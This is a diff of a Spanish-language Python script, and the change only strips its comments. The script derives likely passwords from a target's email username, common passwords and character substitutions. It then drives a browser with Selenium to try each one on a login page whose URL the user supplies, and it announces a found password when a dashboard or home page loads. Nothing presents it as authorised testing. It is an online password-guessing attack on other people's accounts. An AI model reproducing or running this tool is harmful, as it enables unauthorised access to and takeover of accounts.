@@ -4,14 +4,14 @@ import re
 from selenium import webdriver
 from selenium.webdriver.common.by import By
 
-# Función para generar contraseñas más certeras
+
 def generar_posibles_contrasenas(correo):
     """Genera una lista de contraseñas más certeras basadas en patrones comunes."""
     
-    # Extraer solo el nombre de usuario (sin el @gmail.com o @hotmail.com)
+    
     nombre_usuario = correo.split("@")[0].replace(" ", "")
 
-    # Listas con variaciones del nombre de usuario
+    
     palabras_comunes = [
         nombre_usuario, nombre_usuario.capitalize(), nombre_usuario.lower(), nombre_usuario.upper(),
         nombre_usuario + "123", nombre_usuario + "2024", nombre_usuario + "!", nombre_usuario + "$", 
@@ -19,7 +19,7 @@ def generar_posibles_contrasenas(correo):
         "Welcome1", "P@ssw0rd", "Hola123", "Test2023", "12345678", "Admin2024"
     ]
 
-    # Variaciones con sustituciones de caracteres
+    
     sustituciones = {
         "o": "0",
         "a": "@",
@@ -33,26 +33,26 @@ def generar_posibles_contrasenas(correo):
             palabra = palabra.replace(letra, reemplazo)
         return palabra
 
-    # Generar combinaciones con sustituciones
+    
     palabras_comunes.extend([sustituir_letras(palabra) for palabra in palabras_comunes])
 
-    # Lista de números y caracteres especiales para combinaciones
+    
     numeros = ["123", "456", "789", "2024", "1", "2", "3", "0"]
     caracteres_especiales = ["!", "@", "#", "$", "%", "&", "*", "-", "_", "+", "="]
 
     posibles_contrasenas = set()
 
-    # Generar combinaciones con números y caracteres especiales
+    
     for palabra in palabras_comunes:
         for numero in numeros:
             for caracter in caracteres_especiales:
                 contrasena = palabra + numero + caracter
                 posibles_contrasenas.add(contrasena)
 
-    # Priorizar contraseñas que comiencen con una letra (más probables primero)
+    
     return sorted(posibles_contrasenas, key=lambda x: x[0].isalpha(), reverse=True)
 
-# Función para guardar contraseñas en un archivo .txt
+
 def guardar_contrasenas(correo, contrasenas):
     """Guarda las contraseñas generadas en un archivo de texto."""
     archivo_salida = "contrasenas_generadas.txt"
@@ -65,7 +65,7 @@ def guardar_contrasenas(correo, contrasenas):
     
     print(f"Las contraseñas han sido guardadas en {archivo_salida}")
 
-# Función para esperar hasta que el usuario ingrese un correo válido
+
 def esperar_ingreso_correo(driver):
     """Espera hasta que el usuario ingrese un correo completo con '@' y un dominio válido."""
     try:
@@ -88,7 +88,7 @@ def esperar_ingreso_correo(driver):
         print(f"Error al esperar el correo: {e}")
         return None
 
-# Función para probar el login con las contraseñas generadas
+
 def probar_login(driver, correo, contrasenas):
     """Automatiza el intento de login en la página con diferentes contraseñas."""
     try:
@@ -107,7 +107,7 @@ def probar_login(driver, correo, contrasenas):
 
             time.sleep(2)  # Esperar la respuesta de la página
 
-            # Verificar si el login fue exitoso
+            
             if "dashboard" in driver.current_url or "home" in driver.current_url:
                 print(f"¡Contraseña encontrada!: {contrasena}")
                 driver.quit()
@@ -119,7 +119,7 @@ def probar_login(driver, correo, contrasenas):
         print(f"Error en la prueba de login: {e}")
         driver.quit()
 
-# Main
+
 if __name__ == "__main__":
     url_login = input("Digite el link de la página: ").strip()
     
